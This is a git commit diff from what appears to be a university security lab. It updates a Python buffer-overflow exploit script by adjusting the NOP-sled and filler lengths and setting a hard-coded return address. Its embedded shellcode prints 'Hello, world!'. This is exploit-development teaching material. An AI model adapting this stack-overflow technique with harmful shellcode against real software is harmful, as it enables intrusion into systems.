2ab84703dff4f7f3512a47b2fe22d9e6b6975663
dabinlee708 <dabin.lee@outlook.com>
2016-03-15 21:14:44 +0800

    lab5_Part5_Done

--- security/lab05/payload.py
+++ security/lab05/payload.py
@@ -4,8 +4,8 @@
 
 from struct import *
 
-lennops = 10 # or some other value
-lenfill = 48 # or some other value
+lennops = 80 # or some other value
+lenfill = 72 # or some other value
 
 # Hello World! payload - designed by Oka, 2014
 payload = '\xeb\x2a\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xd1\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21'
@@ -13,11 +13,13 @@ payload = '\xeb\x2a\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb8\x01\x00\
 # Set up return address. Pack is best to turn int to binary
 # for inside gdb
 #address = pack("<Q", 0xdeadbeef)
+# address = pack("<Q", 0x7fffffffde80)
 
 # for outside gdb
-#address = pack("<Q", 0xdeadbeef)       
+# address = pack("<Q", 0xdeadbeef)       
+address = pack("<Q", 0x7fffffffde78) 
 
-address = "DDDDDDDD" 
+# address = "DDDDDDDD" 
 
 nops = "\x90" * lennops 
 
